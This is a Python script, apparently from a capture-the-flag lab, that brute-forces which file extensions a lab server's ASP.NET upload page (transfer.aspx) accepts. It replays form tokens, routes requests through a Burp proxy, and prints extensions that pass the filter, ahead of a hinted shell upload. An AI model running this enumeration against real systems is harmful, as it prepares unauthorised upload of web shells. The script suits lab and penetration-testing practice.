import requests
import re

def TestUpload(filename):
    url = "http://10.10.10.93/transfer.aspx"
    burp = {'http': "http://127.0.0.1:8080"}
    s = requests.session()

    r = s.get(url)

    ViewState = re.findall(r'VIEWSTATE" value="(.*?)"', r.text)[0]
    EventValidation= re.findall(r'__EVENTVALIDATION" value="(.*?)"', r.text)[0]
    
    post_data = {
        '__VIEWSTATE': ViewState,
        '__EVENTVALIDATION': EventValidation,
        'btnUpload': 'upload'
    }

    uploaded_file = {"FileUpload1": (filename, 'jason did it')}

    r = s.post(url, files=uploaded_file, data=post_data, proxies=burp)
    return r.text

for extension in open('extensions.lst', 'r'):
    response = TestUpload('jason.' + extension[:-1])
    if "Invalid File" not in response:
        print(extension)

#print(TestUpload("helloshell"))
